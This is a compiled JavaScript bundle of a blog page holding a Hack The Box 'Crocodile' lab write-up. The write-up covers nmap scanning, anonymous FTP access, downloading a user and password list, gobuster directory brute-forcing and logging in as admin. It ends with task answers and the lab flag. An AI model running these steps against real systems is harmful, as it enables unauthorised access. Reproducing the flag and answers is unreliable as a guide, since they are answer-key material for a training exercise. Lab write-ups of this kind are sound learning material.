"use strict";(globalThis.webpackChunkmy_own_blog=globalThis.webpackChunkmy_own_blog||[]).push([[1332],{28453:(e,n,s)=>{s.d(n,{R:()=>o,x:()=>a});var t=s(96540);const r={},i=t.createContext(r);function o(e){const n=t.useContext(i);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:o(e.components),t.createElement(i.Provider,{value:n},e.children)}},29622:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>h,frontMatter:()=>o,metadata:()=>t,toc:()=>d});const t=JSON.parse('{"id":"hack-the-box/starting-point/tier-1/crocodile/crocodile","title":"Crocodile","description":"- Difficulty: Very easy","source":"@site/docs/hack-the-box/starting-point/tier-1/3-crocodile/3-crocodile.mdx","sourceDirName":"hack-the-box/starting-point/tier-1/3-crocodile","slug":"/hack-the-box/starting-point/tier-1/crocodile/","permalink":"/docs/hack-the-box/starting-point/tier-1/crocodile/","draft":false,"unlisted":false,"tags":[{"inline":false,"label":"Linux","permalink":"/docs/tags/linux","description":"Includes write-ups on the topic of Linux"},{"inline":false,"label":"Network","permalink":"/docs/tags/network","description":"Includes write-ups on the topic of Network"},{"inline":false,"label":"Web","permalink":"/docs/tags/web","description":"Includes write-ups on the topic of Web"}],"version":"current","sidebarPosition":3,"frontMatter":{"tags":["linux","network","web"],"sidebar_position":3},"sidebar":"writeupsSidebar","previous":{"title":"Sequel","permalink":"/docs/hack-the-box/starting-point/tier-1/sequel"},"next":{"title":"Challenges","permalink":"/docs/category/challenges-1"}}');var r=s(74848),i=s(28453);const o={tags:["linux","network","web"],sidebar_position:3},a="Crocodile",l={},d=[{value:"\ud83d\udd0e Solution",id:"-solution",level:2},{value:"\u270f\ufe0f Task answers",id:"\ufe0f-task-answers",level:2},{value:"\ud83d\udea9Flag",id:"flag",level:2}];function c(e){const n={blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"crocodile",children:"Crocodile"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Difficulty:"})," Very easy"]}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"-solution",children:"\ud83d\udd0e Solution"}),"\n",(0,r.jsx)(n.p,{children:"I ran a full-port, fast service/version scan against the target and found 2 services: FTP on port 21 and a web server on port 80."}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"> nmap -p- -sV -sC --min-rate 5000 10.129.45.90\r\n\r\nPORT   STATE SERVICE VERSION\r\n21/tcp open  ftp     vsftpd 3.0.3\r\n| ftp-syst: \r\n|   STAT: \r\n| FTP server status:\r\n|      Connected to ::ffff:10.10.16.35\r\n|      Logged in as ftp\r\n|      TYPE: ASCII\r\n|      No session bandwidth limit\r\n|      Session timeout in seconds is 300\r\n|      Control connection is plain text\r\n|      Data connections will be plain text\r\n|      At session startup, client count was 3\r\n|      vsFTPd 3.0.3 - secure, fast, stable\r\n|_End of status\r\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\r\n| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist\r\n|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd\r\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\r\n|_http-title: Smash - Bootstrap Business Template\r\n|_http-server-header: Apache/2.4.41 (Ubuntu)\r\nService Info: OS: Unix\n"})}),"\n",(0,r.jsx)(n.p,{children:"Because anonymous FTP was allowed I connected using the standard anonymous login and was admitted immediately."}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"> ftp 10.129.45.90\r\nConnected to 10.129.45.90.\r\n220 (vsFTPd 3.0.3)\r\nName (10.129.45.90:kali): anonymous\r\n230 Login successful.\r\nRemote system type is UNIX.\r\nUsing binary mode to transfer files.\n"})}),"\n",(0,r.jsx)(n.p,{children:"Listing the remote directory revealed 2 files."}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"ftp> ls\r\n229 Entering Extended Passive Mode (|||42274|)\r\n150 Here comes the directory listing.\r\n-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist\r\n-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd\r\n226 Directory send OK.\n"})}),"\n",(0,r.jsxs)(n.p,{children:["I downloaded both with ",(0,r.jsx)(n.code,{children:"get"}),":"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"ftp> get allowed.userlist\r\nlocal: allowed.userlist remote: allowed.userlist\r\n229 Entering Extended Passive Mode (|||45734|)\r\n150 Opening BINARY mode data connection for allowed.userlist (33 bytes).\r\n100% |***************************************************************|    33        0.11 KiB/s    00:00 ETA\r\n226 Transfer complete.\r\n33 bytes received in 00:01 (0.02 KiB/s)\r\nftp> get allowed.userlist.passwd\r\nlocal: allowed.userlist.passwd remote: allowed.userlist.passwd\r\n229 Entering Extended Passive Mode (|||49970|)\r\n150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).\r\n100% |***************************************************************|    62        0.22 KiB/s    00:00 ETA\r\n226 Transfer complete.\r\n62 bytes received in 00:01 (0.05 KiB/s)\n"})}),"\n",(0,r.jsxs)(n.p,{children:["Inspecting the files showed a short list of usernames and a corresponding list of passwords.\r\nNotably, ",(0,r.jsx)(n.code,{children:"admin"})," appears in the userlist and the matching password looks like ",(0,r.jsx)(n.code,{children:"rKXM59ESxesUFHAd"}),", which makes it a likely candidate for a site login."]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"> cat allowed.userlist       \r\naron\r\npwnmeow\r\negotisticalsw\r\nadmin\r\n\r\n> cat allowed.userlist.passwd \r\nroot\r\nSupersecretpassword1\r\n@BaASD&9032123sADS\r\nrKXM59ESxesUFHAd\n"})}),"\n",(0,r.jsxs)(n.p,{children:["I opened the web root in a browser but didn't immediately find a login page.\r\nTo discover hidden or unlinked paths I ran a directory brute-force using ",(0,r.jsx)(n.code,{children:"gobuster"})," (searching for ",(0,r.jsx)(n.code,{children:".php"})," entries).\r\nThe scan revealed ",(0,r.jsx)(n.code,{children:"/login.php"}),"."]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"> gobuster dir -u http://10.129.45.90:80/ -w /usr/share/wordlists/dirb/common.txt -x php -t 50 -e -o gobuster_dir.txt\r\n\r\n===============================================================\r\nGobuster v3.8\r\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\r\n===============================================================\r\n[+] Url:                     http://10.129.45.90:80/\r\n[+] Method:                  GET\r\n[+] Threads:                 50\r\n[+] Wordlist:                /usr/share/wordlists/dirb/common.txt\r\n[+] Negative Status codes:   404\r\n[+] User Agent:              gobuster/3.8\r\n[+] Extensions:              php\r\n[+] Expanded:                true\r\n[+] Timeout:                 10s\r\n===============================================================\r\nStarting gobuster in directory enumeration mode\r\n===============================================================\r\n/.hta.php.hta.php             (Status: 403) [Size: 277]\r\n/.hta.hta                 (Status: 403) [Size: 277]\r\n/.htaccess.htaccess            (Status: 403) [Size: 277]\r\n/.htpasswd.htpasswd            (Status: 403) [Size: 277]\r\n/.htaccess.php.htaccess.php        (Status: 403) [Size: 277]\r\n/.htpasswd.php.htpasswd.php        (Status: 403) [Size: 277]\r\n/assetsassets               (Status: 301) [Size: 313] [--\x3e http://10.129.45.90/assets/]\r\n/config.phpconfig.php           (Status: 200) [Size: 0]\r\n/csscss                  (Status: 301) [Size: 310] [--\x3e http://10.129.45.90/css/]\r\n/dashboarddashboard            (Status: 301) [Size: 316] [--\x3e http://10.129.45.90/dashboard/]\r\n/fontsfonts                (Status: 301) [Size: 312] [--\x3e http://10.129.45.90/fonts/]\r\n/index.htmlindex.html           (Status: 200) [Size: 58565]\r\n/jsjs                   (Status: 301) [Size: 309] [--\x3e http://10.129.45.90/js/]\r\n/login.phplogin.php            (Status: 200) [Size: 1577]\r\n/logout.phplogout.php           (Status: 302) [Size: 0] [--\x3e login.php]\r\n/server-statusserver-status        (Status: 403) [Size: 277]\r\nProgress: 9226 / 9226 (100.00%)\r\n===============================================================\r\nFinished\n"})}),"\n",(0,r.jsxs)(n.p,{children:["I navigated to ",(0,r.jsx)(n.code,{children:"http://10.129.45.90/login.php"}),", submitted the credentials ",(0,r.jsx)(n.code,{children:"admin:rKXM59ESxesUFHAd"}),", and successfully logged in.\r\nThe login redirected me to a page that contained the flag."]}),"\n",(0,r.jsx)("div",{style:{width:"100%",margin:"0 auto"}}),"\n",(0,r.jsx)(n.h2,{id:"\ufe0f-task-answers",children:"\u270f\ufe0f Task answers"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Task 1:"})," What Nmap scanning switch employs the use of default scripts during a scan?"]}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"-sC"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Task 2:"})," What service version is found to be running on port 21?"]}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"vsftpd 3.0.3"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Task 3:"}),' What FTP code is returned to us for the "Anonymous FTP login allowed" message?']}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"230"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Task 4:"})," After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?"]}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"anonymous"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Task 5:"})," After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?"]}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"get"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Task 6:"})," What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server?"]}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"admin"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Task 7:"})," What version of Apache HTTP Server is running on the target host?"]}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"Apache httpd 2.4.41"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Task 8:"})," What switch can we use with Gobuster to specify we are looking for specific filetypes?"]}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"-x"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Task 9:"})," Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?"]}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"login.php"}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"flag",children:"\ud83d\udea9Flag"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"c7110277ac44d78b6a9fff2232434d16"})}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(c,{...e})}):c(e)}}}]);